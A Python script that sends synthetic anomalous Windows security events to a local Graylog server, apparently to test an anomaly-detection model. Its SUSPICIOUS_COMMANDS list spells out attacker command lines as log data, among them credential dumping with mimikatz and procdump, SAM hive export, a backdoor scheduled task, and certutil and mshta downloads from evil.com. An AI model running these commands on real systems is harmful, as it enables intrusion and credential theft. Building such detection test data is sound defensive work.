import socket
import json
import random
from datetime import datetime, timedelta

GRAYLOG_IP = "127.0.0.1"
GRAYLOG_PORT = 12201
BASE_DATE = datetime(2026, 3, 9, 0, 0, 0)  # Monday — matches syn.py BASE_DATE

# =========================================================
# syn.py CONSTANTS — reproduced so anomalies are clearly
# outside what the model was trained on
# =========================================================
USER_PROFILES = {
    "joshua":   {"home_ip": "192.168.56.104", "work_start": 8, "fav_app": "chrome.exe"},
    "yvonne":   {"home_ip": "192.168.1.10",   "work_start": 7, "fav_app": "msedge.exe"},
    "vincent":  {"home_ip": "10.0.2.15",      "work_start": 9, "fav_app": "WINWORD.EXE"},
    "testuser": {"home_ip": "192.168.56.1",   "work_start": 8, "fav_app": "powershell.exe"}
}
REGULAR_USERS  = list(USER_PROFILES.keys())
INTERNAL_IPS   = ["192.168.56.104", "192.168.1.10", "10.0.2.15", "192.168.56.1", "127.0.0.1"]
ADMIN_ACCOUNTS = ["Administrator", "SYSTEM"]

SUSPICIOUS_COMMANDS = [
    "mimikatz.exe",
    "whoami.exe",
    "net.exe user /add",
    "net.exe localgroup administrators /add",
    "procdump.exe lsass",
    "reg.exe save HKLM\\SAM sam.hive",
    "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
    "wscript.exe payload.vbs",
    "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe",
    "schtasks.exe /create /tn backdoor /tr cmd.exe /sc onlogon",
    "powershell.exe -EncodedCommand ZQBj...",
    "mshta.exe http://evil.com/payload.hta",
]

# =========================================================
# EventID coverage map (all IDs present in fetch query)
# =========================================================
# AuthenticationEvents:    4624, 4625, 4634, 4648, 4672
# AccountManagementEvents: 4720, 4722, 4723, 4724, 4725, 4726,
#                          4728, 4729, 4732, 4733, 4740, 4781
# ProcessCreationEvents:   4688, 4689

# =========================================================
# HELPERS
# =========================================================
def send_to_graylog(message):
    try:
        if "short_message" not in message:
            message["short_message"] = f"Anomaly Alert: {message.get('_scenario', 'Unknown')}"
        payload = json.dumps(message) + "\0"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            sock.connect((GRAYLOG_IP, GRAYLOG_PORT))
            sock.sendall(payload.encode("utf-8"))
            return True
    except Exception as e:
        print(f"Error sending log: {e}")
        return False

def safe_timestamp(now, day_offset, hour, minute):
    dt = BASE_DATE + timedelta(days=day_offset)
    dt = dt.replace(hour=hour, minute=minute, second=random.randint(0, 59))
    ceiling = now - timedelta(minutes=2)
    if dt > ceiling:
        dt = ceiling - timedelta(minutes=random.randint(1, 30))
    return dt

def get_safe_total_days(now):
    safe_end = now - timedelta(days=1)
    if BASE_DATE >= safe_end:
        return 0
    return (safe_end - BASE_DATE).days

def off_hours_dt(now, day_offset):
    return safe_timestamp(now, day_offset, random.randint(1, 4), random.randint(0, 59))

def external_ip():
    return f"{random.choice([194,91,185,45])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(2,254)}"

def sunday_offset(now):
    """Returns a day_offset that lands on a Sunday, or None if none available."""
    total_days = get_safe_total_days(now)
    days_to_first_sunday = (6 - BASE_DATE.weekday()) % 7 or 7
    offset = days_to_first_sunday
    while offset > total_days:
        offset -= 7
    return offset if offset >= 0 else None

# =========================================================
# AUTH — anomalous event senders
# Covers: 4624, 4625, 4634, 4648, 4672
# =========================================================

def send_anon_unknown_user_logon(dt):
    """4624 — Unknown user from external IP. TargetUserName_Freq=0, IpAddress_Freq=0."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4624,
        "TargetUserName": random.choice(["attacker_svc", "svc_backup", "admin_temp"]),
        "IpAddress": external_ip(),
        "_scenario": "ANOMALY_AUTH_4624_UNKNOWN_USER"
    })

def send_anon_known_user_ext_ip(dt, user):
    """4624 — Known user, external IP. Breaks the 98% home-IP affinity."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4624,
        "TargetUserName": user, "IpAddress": external_ip(),
        "_scenario": "ANOMALY_AUTH_4624_EXT_IP"
    })

def send_anon_brute_force(now, day_offset, user):
    """4625 burst → 4624 success. Multiple failures from external IP = brute force."""
    base_dt = off_hours_dt(now, day_offset)
    for j in range(random.randint(6, 12)):
        fail_dt = base_dt + timedelta(seconds=j * random.randint(3, 15))
        if fail_dt > now - timedelta(minutes=2):
            break
        send_to_graylog({
            "version": "1.1", "host": "AD01", "timestamp": fail_dt.timestamp(),
            "Category": "AuthenticationEvents", "EventID": 4625,
            "TargetUserName": user, "IpAddress": external_ip(),
            "_scenario": "ANOMALY_AUTH_4625_BRUTE"
        })
    success_dt = base_dt + timedelta(minutes=random.randint(1, 5))
    if success_dt < now - timedelta(minutes=2):
        send_to_graylog({
            "version": "1.1", "host": "AD01", "timestamp": success_dt.timestamp(),
            "Category": "AuthenticationEvents", "EventID": 4624,
            "TargetUserName": user, "IpAddress": external_ip(),
            "_scenario": "ANOMALY_AUTH_4624_AFTER_BRUTE"
        })

def send_anon_suspicious_logoff(dt):
    """4634 — Logoff for an unknown user (the session it closes was never seen)."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4634,
        "TargetUserName": "attacker_svc", "IpAddress": external_ip(),
        "_scenario": "ANOMALY_AUTH_4634_UNKNOWN"
    })

def send_anon_explicit_cred_external(dt, user):
    """4648 — Explicit credential use from external IP. Normal 4648 uses internal IP."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4648,
        "TargetUserName": user, "IpAddress": external_ip(),
        "_scenario": "ANOMALY_AUTH_4648_EXT"
    })

def send_anon_special_privs_unknown(dt):
    """4672 — Special privileges for an unknown user. Unexpected privilege elevation."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4672,
        "TargetUserName": random.choice(["attacker_svc", "ghost_admin"]),
        "IpAddress": external_ip(),
        "_scenario": "ANOMALY_AUTH_4672_UNKNOWN"
    })

def send_anon_lateral_movement(now, day_offset, user):
    """4624 rapid-fire from multiple external IPs — lateral movement."""
    base_dt = off_hours_dt(now, day_offset)
    for j in range(random.randint(3, 6)):
        hop_dt = base_dt + timedelta(minutes=j * random.randint(2, 8))
        if hop_dt > now - timedelta(minutes=2):
            break
        send_to_graylog({
            "version": "1.1", "host": f"WS{random.randint(1,5):02d}",
            "timestamp": hop_dt.timestamp(),
            "Category": "AuthenticationEvents", "EventID": 4624,
            "TargetUserName": user, "IpAddress": external_ip(),
            "_scenario": "ANOMALY_AUTH_LATERAL"
        })

def send_anon_sunday_auth(now):
    """4624 on a Sunday — syn.py weight=0 for Sunday, model has zero Sunday examples."""
    offset = sunday_offset(now)
    if offset is None:
        return
    dt   = safe_timestamp(now, offset, random.randint(0, 23), random.randint(0, 59))
    user = random.choice(REGULAR_USERS)
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AuthenticationEvents", "EventID": 4624,
        "TargetUserName": user, "IpAddress": USER_PROFILES[user]["home_ip"],
        "_scenario": "ANOMALY_AUTH_SUNDAY"
    })

# =========================================================
# PROCESS — anomalous event senders
# Covers: 4688, 4689
# =========================================================

def send_anon_known_user_suspicious_cmd(dt, user):
    """4688 — Known user running attacker tooling. CommandLine_Freq=0."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "ProcessCreationEvents", "EventID": 4688,
        "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
        "_scenario": "ANOMALY_PROC_4688_KNOWN_USER"
    })

def send_anon_unknown_user_cmd(dt):
    """4688 — Unknown user + suspicious command. Double zero-frequency hit."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "ProcessCreationEvents", "EventID": 4688,
        "SubjectUserName": random.choice(["attacker_svc", "svc_backup"]),
        "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
        "_scenario": "ANOMALY_PROC_4688_UNKNOWN_USER"
    })

def send_anon_process_exit_suspicious(dt, user):
    """4689 — Process exit for a suspicious tool. Paired exit after anomalous 4688."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "ProcessCreationEvents", "EventID": 4689,
        "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
        "_scenario": "ANOMALY_PROC_4689_SUSPICIOUS"
    })

def send_anon_sunday_proc(now):
    """4688 on Sunday with suspicious command — time + command both anomalous."""
    offset = sunday_offset(now)
    if offset is None:
        return
    dt   = safe_timestamp(now, offset, random.randint(0, 23), random.randint(0, 59))
    user = random.choice(REGULAR_USERS)
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "ProcessCreationEvents", "EventID": 4688,
        "SubjectUserName": user, "CommandLine": random.choice(SUSPICIOUS_COMMANDS),
        "_scenario": "ANOMALY_PROC_SUNDAY"
    })

# =========================================================
# ACCOUNT MANAGEMENT — anomalous event senders
# Covers ALL 12 fetch EventIDs with anomalous variants:
# 4720, 4722, 4723, 4724, 4725, 4726, 4728, 4729,
# 4732, 4733, 4740, 4781
# =========================================================

def send_anon_nonadmin_creates_account(dt, i):
    """4720 — Non-admin creating a backdoor account. SubjectUserName is a regular user."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4720,
        "SubjectUserName": random.choice(REGULAR_USERS),   # NOT admin
        "TargetUserName": f"backdoor_{i}",
        "_scenario": "ANOMALY_ACCT_4720_NONADMIN"
    })

def send_anon_unknown_target_enabled(dt):
    """4722 — Admin enabling an account the model has never seen."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4722,
        "SubjectUserName": random.choice(ADMIN_ACCOUNTS),
        "TargetUserName": f"ghost_{random.randint(100,999)}",
        "_scenario": "ANOMALY_ACCT_4722_UNKNOWN_TARGET"
    })

def send_anon_nonadmin_password_change(dt, user):
    """4723 — Non-admin changing another user's password (lateral privilege abuse)."""
    target = random.choice([u for u in REGULAR_USERS if u != user])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4723,
        "SubjectUserName": user,    # regular user acting on another account
        "TargetUserName": target,
        "_scenario": "ANOMALY_ACCT_4723_NONADMIN_OTHER"
    })

def send_anon_nonadmin_resets_password(dt, user):
    """4724 — Non-admin resetting another user's password."""
    target = random.choice([u for u in REGULAR_USERS if u != user])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4724,
        "SubjectUserName": user,
        "TargetUserName": target,
        "_scenario": "ANOMALY_ACCT_4724_NONADMIN"
    })

def send_anon_nonadmin_disables_account(dt, user):
    """4725 — Regular user disabling another account. Should only be admin action."""
    target = random.choice([u for u in REGULAR_USERS if u != user])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4725,
        "SubjectUserName": user,
        "TargetUserName": target,
        "_scenario": "ANOMALY_ACCT_4725_NONADMIN"
    })

def send_anon_nonadmin_deletes_account(dt, user):
    """4726 — Regular user deleting an account. High-severity anomaly."""
    target = random.choice([u for u in REGULAR_USERS if u != user])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4726,
        "SubjectUserName": user,
        "TargetUserName": target,
        "_scenario": "ANOMALY_ACCT_4726_NONADMIN"
    })

def send_anon_nonadmin_group_add(dt, user):
    """4728/4732 — Non-admin adding members to security/local group."""
    event_id = random.choice([4728, 4732])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": event_id,
        "SubjectUserName": user,
        "TargetUserName": random.choice(["attacker_svc", f"ghost_{random.randint(1,99)}"]),
        "_scenario": f"ANOMALY_ACCT_{event_id}_NONADMIN"
    })

def send_anon_nonadmin_group_remove(dt, user):
    """4729/4733 — Non-admin removing members (covering tracks)."""
    event_id = random.choice([4729, 4733])
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": event_id,
        "SubjectUserName": user,
        "TargetUserName": random.choice(REGULAR_USERS),
        "_scenario": f"ANOMALY_ACCT_{event_id}_NONADMIN"
    })

def send_anon_mass_lockout(now, day_offset):
    """4740 — Multiple accounts locked out in rapid succession (attacker triggering lockouts)."""
    base_dt = off_hours_dt(now, day_offset)
    for j, user in enumerate(REGULAR_USERS):
        lock_dt = base_dt + timedelta(seconds=j * random.randint(5, 20))
        if lock_dt > now - timedelta(minutes=2):
            break
        send_to_graylog({
            "version": "1.1", "host": "AD01", "timestamp": lock_dt.timestamp(),
            "Category": "AccountManagementEvents", "EventID": 4740,
            "SubjectUserName": random.choice(["attacker_svc", "svc_backup"]),
            "TargetUserName": user,
            "_scenario": "ANOMALY_ACCT_4740_MASS_LOCKOUT"
        })

def send_anon_nonadmin_renames_account(dt, user):
    """4781 — Regular user renaming an account (covering tracks or escalating)."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "AccountManagementEvents", "EventID": 4781,
        "SubjectUserName": user,
        "TargetUserName": random.choice([u for u in REGULAR_USERS if u != user]),
        "_scenario": "ANOMALY_ACCT_4781_NONADMIN"
    })

def send_anon_privilege_escalation(dt, user):
    """4688 net /add + 4720 account creation — full priv-esc chain across PROC+ACCT."""
    send_to_graylog({
        "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
        "Category": "ProcessCreationEvents", "EventID": 4688,
        "SubjectUserName": user,
        "CommandLine": f"net.exe localgroup administrators {user} /add",
        "_scenario": "ANOMALY_PRIVESC_CMD"
    })
    follow_dt = dt + timedelta(seconds=random.randint(10, 60))
    if follow_dt < dt + timedelta(hours=1):
        send_to_graylog({
            "version": "1.1", "host": "AD01", "timestamp": follow_dt.timestamp(),
            "Category": "AccountManagementEvents", "EventID": 4720,
            "SubjectUserName": user,
            "TargetUserName": f"escalated_{user}",
            "_scenario": "ANOMALY_PRIVESC_ACCT"
        })

# =========================================================
# MAIN GENERATOR
# =========================================================
def generate_diverse_anomalies(n=60):
    now        = datetime.now()
    total_days = get_safe_total_days(now)
    if total_days == 0:
        print("[!] BASE_DATE is too recent — no valid date range.")
        return

    safe_end = now - timedelta(days=1)
    print(f"Injecting {n} anomaly groups into {BASE_DATE.date()} – {safe_end.date()} window...")

    # One sender per scenario — cycled evenly so every EventID gets coverage
    # Each tuple: (function, needs_user, needs_day_offset, needs_now_only)
    scenarios = [
        # AUTH
        ("unknown_logon",       send_anon_unknown_user_logon,       False, False),
        ("known_ext_ip",        send_anon_known_user_ext_ip,        True,  False),
        ("brute_force",         send_anon_brute_force,              True,  True ),
        ("suspicious_logoff",   send_anon_suspicious_logoff,        False, False),
        ("explicit_cred_ext",   send_anon_explicit_cred_external,   True,  False),
        ("special_priv_unknown",send_anon_special_privs_unknown,    False, False),
        ("lateral_movement",    send_anon_lateral_movement,         True,  True ),
        ("sunday_auth",         send_anon_sunday_auth,              False, True ),
        # PROC
        ("known_susp_cmd",      send_anon_known_user_suspicious_cmd,True,  False),
        ("unknown_user_cmd",    send_anon_unknown_user_cmd,         False, False),
        ("proc_exit_susp",      send_anon_process_exit_suspicious,  True,  False),
        ("sunday_proc",         send_anon_sunday_proc,              False, True ),
        # ACCT
        ("nonadmin_create",     send_anon_nonadmin_creates_account, True,  False),
        ("unknown_target_en",   send_anon_unknown_target_enabled,   False, False),
        ("nonadmin_pwd_change", send_anon_nonadmin_password_change, True,  False),
        ("nonadmin_pwd_reset",  send_anon_nonadmin_resets_password, True,  False),
        ("nonadmin_disable",    send_anon_nonadmin_disables_account,True,  False),
        ("nonadmin_delete",     send_anon_nonadmin_deletes_account, True,  False),
        ("nonadmin_grp_add",    send_anon_nonadmin_group_add,       True,  False),
        ("nonadmin_grp_remove", send_anon_nonadmin_group_remove,    True,  False),
        ("mass_lockout",        send_anon_mass_lockout,             False, True ),
        ("nonadmin_rename",     send_anon_nonadmin_renames_account, True,  False),
        ("priv_escalation",     send_anon_privilege_escalation,     True,  False),
    ]

    for i in range(n):
        day_offset   = random.randint(0, total_days)
        user         = random.choice(REGULAR_USERS)
        dt           = off_hours_dt(now, day_offset)
        name, fn, needs_user, needs_now = scenarios[i % len(scenarios)]

        if needs_now and needs_user:
            fn(now, day_offset, user)
        elif needs_now and not needs_user:
            if name == "mass_lockout":
                fn(now, day_offset)
            else:
                fn(now)
        elif needs_user:
            if name == "nonadmin_create":
                fn(dt, i)
            else:
                fn(dt, user)
        else:
            fn(dt)

    print(f"  [+] Done. Injected {n} anomaly groups across {len(scenarios)} scenario types.")

if __name__ == "__main__":
    generate_diverse_anomalies()
